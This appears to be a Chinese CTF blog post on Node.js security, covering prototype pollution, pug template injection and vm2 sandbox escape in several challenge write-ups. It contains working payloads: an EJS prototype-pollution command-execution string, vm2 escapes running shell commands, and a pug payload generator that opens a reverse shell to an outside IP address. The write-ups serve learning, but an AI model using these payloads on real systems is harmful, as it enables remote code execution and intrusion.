<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>nodejs相关 | ch3n9w の 超元域</title>
<meta name="keywords" content="">
<meta name="description" content="不会javascript, 在看smi1e师傅关于原型链污染攻击的博客时候, 这张图片让我思考了很久">
<meta name="author" content="ch3n9w">
<link rel="canonical" href="https://ch3n9w.cpolar.cn/posts/sec-javascript-learn/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="icon" type="image/png" sizes="32x32" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="apple-touch-icon" href="https://ch3n9w.cpolar.cn/flash.ico">
<link rel="mask-icon" href="https://ch3n9w.cpolar.cn/flash.ico">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="https://ch3n9w.cpolar.cn/posts/sec-javascript-learn/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript>
  

<meta property="og:title" content="nodejs相关" />
<meta property="og:description" content="不会javascript, 在看smi1e师傅关于原型链污染攻击的博客时候, 这张图片让我思考了很久" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://ch3n9w.cpolar.cn/posts/sec-javascript-learn/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2019-11-17T16:15:38+00:00" />
<meta property="article:modified_time" content="2019-11-17T16:15:38+00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="nodejs相关"/>
<meta name="twitter:description" content="不会javascript, 在看smi1e师傅关于原型链污染攻击的博客时候, 这张图片让我思考了很久"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://ch3n9w.cpolar.cn/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "nodejs相关",
      "item": "https://ch3n9w.cpolar.cn/posts/sec-javascript-learn/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "nodejs相关",
  "name": "nodejs相关",
  "description": "不会javascript, 在看smi1e师傅关于原型链污染攻击的博客时候, 这张图片让我思考了很久\n",
  "keywords": [
    
  ],
  "articleBody": "不会javascript, 在看smi1e师傅关于原型链污染攻击的博客时候, 这张图片让我思考了很久\n很勉强的自己给自己找到一个比喻: cat.prototype是一个对象, 比作仓库, 仓库里面有按照一定顺序摆放的货物, constructor是在这些货物的基础上做的修改, 比如增加什么东西减去什么东西改变什么东西的顺序之类的. 没有constructor, 仓库就是静态的一个仓库, 也就是对象, 但是如果将constructor实施的话, 就是产生一个拥有新货物的仓库, 也就是cat实例对象, 那么类又是什么概念? 就像是给仓库定下一个整理计划, 这个计划叫做constructor, 而这个计划还没有实施, 你说他是静态的仓库(对象)似乎不妥, 因为有计划的存在, 这个仓库是可变的, 这个状态可以变化的仓库就叫做类.\n当然这种比喻很牵强, 我也不知道合不合理, 也只是为了更好理解原型链污染而做的臆想…\n然后对于p师傅博客中写道关于字典赋值proto无效的问题,实验了一下:\n字典在创立的时候应该是先创立字典内的项然后将他们聚合起来, 那么在创立a的时候先创立的是a的原型, 然后再创立的a, 这也就解释了为什么bar传不到Object中去,而是传入了Object的下一级, 也就是a的原型.\nNPUCTF 2020 验证🐎 参考\nhttps://www.plasf.cn/2020/04/25/Node%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83-1/\n春秋战疫赛 Ez_express 源代码如下\nindex.js\nvar express = require('express'); var router = express.Router(); const isObject = obj =\u003e obj \u0026\u0026 obj.constructor \u0026\u0026 obj.constructor === Object; // 这个merge可以造成原型链污染 const merge = (a, b) =\u003e { for (var attr in b) { if (isObject(a[attr]) \u0026\u0026 isObject(b[attr])) { merge(a[attr], b[attr]); } else { a[attr] = b[attr]; } } return a } // clone和merge效果一样 const clone = (a) =\u003e { return merge({}, a); } function safeKeyword(keyword) { if(keyword.match(/(admin)/is)) { return keyword } return undefined } router.get('/', function (req, res) { if(!req.session.user){ res.redirect('/login'); } res.outputFunctionName=undefined; res.render('index',data={'user':req.session.user.user}); }); router.get('/login', function (req, res) { res.render('login'); }); router.post('/login', function (req, res) { if(req.body.Submit==\"register\"){ // 这里safekeyword就是不让通过ADMIN进行注册 if(safeKeyword(req.body.userid)){ res.end(\"\") } req.session.user={ // toUpperCase()除了正常的大小写转化之外会将一些特殊字符进行一个转化 'user':req.body.userid.toUpperCase(), 'passwd': req.body.pwd, 'isLogin':false } res.redirect('/'); } else if(req.body.Submit==\"login\"){ if(!req.session.user){res.end(\"\")} if(req.session.user.user==req.body.userid\u0026\u0026req.body.pwd==req.session.user.passwd){ req.session.user.isLogin=true; } else{ res.end(\"\") } } res.redirect('/'); ; }); router.post('/action', function (req, res) { if(req.session.user.user!=\"ADMIN\"){res.end(\"\")} // 这里有触发原型链污染的机会 req.session.user.data = clone(req.body); res.end(\"\"); }); router.get('/info', function (req, res) { res.render('index',data={'user':res.outputFunctionName}); }) module.exports = router; 要触发原型链污染有个前提条件: 登录admin, 看源码的意思就是首先需要注册一个ADMIN, 但是safekeyword函数将这个操作限制住了, 然而toUpperCase有字符转化的特点, 参考\nhttps://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html\n因此使用admın 和随意的密码去注册一个用户, 就可以登录admin了, 登录admin之后通过action发送如下数据包\n{\"__proto__\":{\"outputFunctionName\":\"_tmp1;return global.process.mainModule.constructor._load('child_process').execSync('ls');//\"}} 发送完之后访问一下/info就拿到了flag\nhttps://medium.com/bugbountywriteup/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501\n[https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split%20second/split%20second.md?tdsourcetag=s_pctim_aiomsg](https://github.com/xiaobye-ctf/CTF-writeups/blob/master/hackim-2020/web/split second/split second.md?tdsourcetag=s_pctim_aiomsg)\n2019 XNUCA hardjs 复现 页面功能: 注册 登录 发表评论\n拿到源代码之后首先使用命令npm audit来自动检测一下是否有存在漏洞的依赖包\n一个原型链污染漏洞, 好的. 看下lodash是干啥的\n查看源代码部分看看在哪里用到了这个lodash\n大意是访问/get路由就会从根据userid从数据库中查询出消息, 判断条数, 如果大于5条的话, 就会对每一条都进行一个lodash.defaultsDeep函数处理, 查查看payload\nconst mergeFn = require('lodash').defaultsDeep; const payload = '{\"constructor\": {\"prototype\": {\"a0\": true}}}' function check() { mergeFn({}, JSON.parse(payload)); if (({})[`a0`] === true) { console.log(`Vulnerable to Prototype Pollution via ${payload}`); } } check(); 那么构造一个类似的应该就可以污染任意参数了.\n然后思路是想通过xss让对面的bot将作为flag的password发送出来, 但是和传统的发送url链接让对面bot查看的方式不一样, 我们没有这么个玩意. 那么想要xss怎么办? 只能伪造登录进bot的账号, 再在bot的消息列表中插入xss代码, 等对面查看的时候就可以触发了, 那么怎么伪造登录呢?\n查看一下登录验证的代码\n好, 那么可以考虑一下把login还有userid这俩都给污染成true\n多发几次然后路由访问/get去触发一下, 把cookie都删掉重新访问后就会发现成功以userid=1的身份登录了.\n登录完之后就要考虑怎么在页面中插入xss代码了\n在app.js中有这么一段\n这个$.extend相当于合并数组, 这种操作也可以造成原型链污染,CVE-2019-11358 再来看页面渲染的部分\n会把符合条件的hints标签都拿出来渲染一遍, 在这个过程中会将沙盒作用在这些标签上\n也就是为什么在如图地方直接写xss代码会无效的原因\n观察渲染模板index.ejs, 发现有一个标签logger不在沙盒限制中并且符合条件, 那么, 可以污染hints让他的原型中包含logger从而让hints在遍历的过程中遍历到logger然后去渲染他, logger里的内容自然是post表单了.\n还有一种解法, 等我会调试js了就去补\njade pug 模板注入 const pug=require('pug'); pug.render('#{console.log(\"1\")}'); pug.render('-console.log(1)'); renderfile也可以模板注入\ncmd = 'bash -i \u003e\u0026 /dev/tcp/192.168.220.157/8888 0\u003e\u00261' payload = \"process.binding('spawn_sync').spawn({file:'bash',args:['/bin/bash','-c','%s'],envPairs:['y='],stdio:[{type:'pipe',readable:1}]})\" % cmd pug = ('''-[][\"constructor\"][\"constructor\"](\"{}\")()'''.format(payload)).replace('\"','%22').replace(\"'\",\"%27\") # pug = ('''#{[][\"constructor\"][\"constructor\"](\"%s\")()}'''%(payload)).replace('\"','%22').replace(\"'\",\"%27\") print quote(pug) https://mp.weixin.qq.com/s/rIXIfhw3vcM9PVJI6HTq2g\n虎符杯 2020 JustEscape 由这个题目而来\nhttps://blog.zeddyu.info/2019/02/14/Hackim-2019/#BabyJS\n可以通过以下形式来进行计算\nhttp://8959c4a3-f43e-45ff-a5e0-7753dd5556d6.node3.buuoj.cn/run.php?code=1-1 但是\nhttp://8959c4a3-f43e-45ff-a5e0-7753dd5556d6.node3.buuoj.cn/run.php?code=1%2b1 会得到\n从后来的表现来看, 是被过滤了.\n看题目的提示,可能后端不是php, 看到插件wappalyzer显示\n而且, Date()函数 在javascript中可以用, 不带参数. php中没有.所以可以判断后端其实是nodejs写的.\n用Error().stack来获取可以使用的模块信息.\nError at vm.js:1:1 at Script.runInContext (vm.js:131:20) at VM.run (/app/node_modules/vm2/lib/main.js:219:62) at /app/server.js:51:33 at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at next (/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5) at /app/node_modules/express/lib/router/index.js:281:22 at Function.process_params (/app/node_modules/express/lib/router/index.js:335:12) 使用payload, 从https://github.com/patriksimek/vm2/issues/225 找到的最新的.\n?code[]=try{Buffer.from(new Proxy({}, {getOwnPropertyDescriptor(){throw f=\u003ef.constructor(\"return process\")();}}));}catch(e){e(()=\u003e{}).mainModule.require(\"child_process\").execSync(\"cat /flag\").toString();} 原题的payload在这里打不了\nvar process; try{ Object.defineProperty(Buffer.from(\"\"),\"\",{ value:new Proxy({},{ getPrototypeOf(target){ if(this.t) throw Buffer.from; this.t=true; Object.getPrototypeOf(target); } }) }); }catch(e){ trueprocess = e.constructor(\"return process\")(); } process.mainModule.require(\"child_process\").execSync(\"ls\").toString() ",
  "wordCount" : "407",
  "inLanguage": "en",
  "datePublished": "2019-11-17T16:15:38Z",
  "dateModified": "2019-11-17T16:15:38Z",
  "author":{
    "@type": "Person",
    "name": "ch3n9w"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://ch3n9w.cpolar.cn/posts/sec-javascript-learn/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "ch3n9w の 超元域",
    "logo": {
      "@type": "ImageObject",
      "url": "https://ch3n9w.cpolar.cn/flash.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://ch3n9w.cpolar.cn/" accesskey="h" title="ch3n9w の 超元域 (Alt + H)">
                <img src="https://ch3n9w.cpolar.cn/sabito.jpg" alt="" aria-label="logo"
                    height="35">ch3n9w の 超元域</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="https://ch3n9w.cpolar.cn/categories/" title="categories">
                    <span>categories</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://ch3n9w.cpolar.cn/">Home</a>&nbsp;»&nbsp;<a href="https://ch3n9w.cpolar.cn/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      nodejs相关
    </h1>
    <div class="post-meta"><span title='2019-11-17 16:15:38 +0000 UTC'>November 17, 2019</span>&nbsp;·&nbsp;2 min&nbsp;·&nbsp;407 words&nbsp;·&nbsp;ch3n9w

</div>
  </header> <div class="toc">
    <details  open>
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><nav id="TableOfContents">
  <ul>
    <li><a href="#npuctf-2020-验证">NPUCTF 2020 验证🐎</a></li>
    <li><a href="#春秋战疫赛-ez_express">春秋战疫赛 Ez_express</a></li>
    <li><a href="#2019-xnuca-hardjs-复现">2019 XNUCA hardjs 复现</a>
      <ul>
        <li><a href="#jade-pug-模板注入">jade pug 模板注入</a></li>
      </ul>
    </li>
    <li><a href="#虎符杯-2020-justescape">虎符杯 2020 JustEscape</a></li>
  </ul>
</nav>
        </div>
    </details>
</div>

  <div class="post-content"><p>不会javascript, 在看smi1e师傅关于原型链污染攻击的博客时候, 这张图片让我思考了很久</p>
<p><img loading="lazy" src="/images/javascript-learn/image-20211114141704409.png" alt="image-20211114141704409"  />
</p>
<p>很勉强的自己给自己找到一个比喻: cat.prototype是一个对象, 比作仓库, 仓库里面有按照一定顺序摆放的货物, constructor是在这些货物的基础上做的修改, 比如增加什么东西减去什么东西改变什么东西的顺序之类的. 没有constructor, 仓库就是静态的一个仓库, 也就是对象, 但是如果将constructor实施的话, 就是产生一个拥有新货物的仓库, 也就是cat实例对象, 那么类又是什么概念? 就像是给仓库定下一个整理计划, 这个计划叫做constructor, 而这个计划还没有实施, 你说他是静态的仓库(对象)似乎不妥, 因为有计划的存在, 这个仓库是可变的, 这个状态可以变化的仓库就叫做类.</p>
<p>当然这种比喻很牵强, 我也不知道合不合理, 也只是为了更好理解原型链污染而做的臆想&hellip;</p>
<p>然后对于p师傅博客中写道关于字典赋值proto无效的问题,实验了一下:</p>
<p><img loading="lazy" src="/images/javascript-learn/image-20211114141713445.png" alt="image-20211114141713445"  />
</p>
<p>字典在创立的时候应该是先创立字典内的项然后将他们聚合起来, 那么在创立a的时候先创立的是a的原型, 然后再创立的a, 这也就解释了为什么bar传不到Object中去,而是传入了Object的下一级, 也就是a的原型.</p>
<h2 id="npuctf-2020-验证">NPUCTF 2020 验证🐎<a hidden class="anchor" aria-hidden="true" href="#npuctf-2020-验证">#</a></h2>
<p>参考</p>
<p><a href="https://www.plasf.cn/2020/04/25/Node%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83-1/">https://www.plasf.cn/2020/04/25/Node%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83-1/</a></p>
<h2 id="春秋战疫赛-ez_express">春秋战疫赛 Ez_express<a hidden class="anchor" aria-hidden="true" href="#春秋战疫赛-ez_express">#</a></h2>
<p>源代码如下</p>
<p>index.js</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;express&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">router</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>.<span style="color:#a6e22e">Router</span>();
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">isObject</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">obj</span> =&gt; <span style="color:#a6e22e">obj</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">constructor</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">obj</span>.<span style="color:#a6e22e">constructor</span> <span style="color:#f92672">===</span> Object;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// 这个merge可以造成原型链污染
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">merge</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">a</span>, <span style="color:#a6e22e">b</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">attr</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">b</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isObject</span>(<span style="color:#a6e22e">a</span>[<span style="color:#a6e22e">attr</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isObject</span>(<span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">attr</span>])) {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">merge</span>(<span style="color:#a6e22e">a</span>[<span style="color:#a6e22e">attr</span>], <span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">attr</span>]);
</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">a</span>[<span style="color:#a6e22e">attr</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">b</span>[<span style="color:#a6e22e">attr</span>];
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">a</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// clone和merge效果一样
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">clone</span> <span style="color:#f92672">=</span> (<span style="color:#a6e22e">a</span>) =&gt; {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">merge</span>({}, <span style="color:#a6e22e">a</span>);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">safeKeyword</span>(<span style="color:#a6e22e">keyword</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">keyword</span>.<span style="color:#a6e22e">match</span>(<span style="color:#960050;background-color:#1e0010">/(admin)/is)) {</span>
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">keyword</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">undefined</span>
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/login&#39;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">outputFunctionName</span><span style="color:#f92672">=</span><span style="color:#66d9ef">undefined</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;index&#39;</span>,<span style="color:#a6e22e">data</span><span style="color:#f92672">=</span>{<span style="color:#e6db74">&#39;user&#39;</span><span style="color:#f92672">:</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">user</span>});
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">render</span>(<span style="color:#e6db74">&#39;login&#39;</span>);
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">Submit</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#34;register&#34;</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#75715e">// 这里safekeyword就是不让通过ADMIN进行注册
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>   <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">safeKeyword</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">userid</span>)){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;&lt;script&gt;alert(&#39;forbid word&#39;);history.go(-1);&lt;/script&gt;&#34;</span>) 
</span></span><span style="display:flex;"><span>   }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span><span style="color:#f92672">=</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// toUpperCase()除了正常的大小写转化之外会将一些特殊字符进行一个转化
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#e6db74">&#39;user&#39;</span><span style="color:#f92672">:</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">userid</span>.<span style="color:#a6e22e">toUpperCase</span>(),
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;passwd&#39;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">pwd</span>,
</span></span><span style="display:flex;"><span>      <span style="color:#e6db74">&#39;isLogin&#39;</span><span style="color:#f92672">:</span><span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>); 
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">Submit</span><span style="color:#f92672">==</span><span style="color:#e6db74">&#34;login&#34;</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>){<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;&lt;script&gt;alert(&#39;register first&#39;);history.go(-1);&lt;/script&gt;&#34;</span>)}
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">user</span><span style="color:#f92672">==</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">userid</span><span style="color:#f92672">&amp;&amp;</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>.<span style="color:#a6e22e">pwd</span><span style="color:#f92672">==</span><span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">passwd</span>){
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">isLogin</span><span style="color:#f92672">=</span><span style="color:#66d9ef">true</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;&lt;script&gt;alert(&#39;error passwd&#39;);history.go(-1);&lt;/script&gt;&#34;</span>)
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">redirect</span>(<span style="color:#e6db74">&#39;/&#39;</span>); ;
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/action&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">user</span><span style="color:#f92672">!=</span><span style="color:#e6db74">&#34;ADMIN&#34;</span>){<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;&lt;script&gt;alert(&#39;ADMIN is asked&#39;);history.go(-1);&lt;/script&gt;&#34;</span>)}
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// 这里有触发原型链污染的机会
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">session</span>.<span style="color:#a6e22e">user</span>.<span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">clone</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;&lt;script&gt;alert(&#39;success&#39;);history.go(-1);&lt;/script&gt;&#34;</span>);  
</span></span><span style="display:flex;"><span>});
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#39;/info&#39;</span>, <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) {
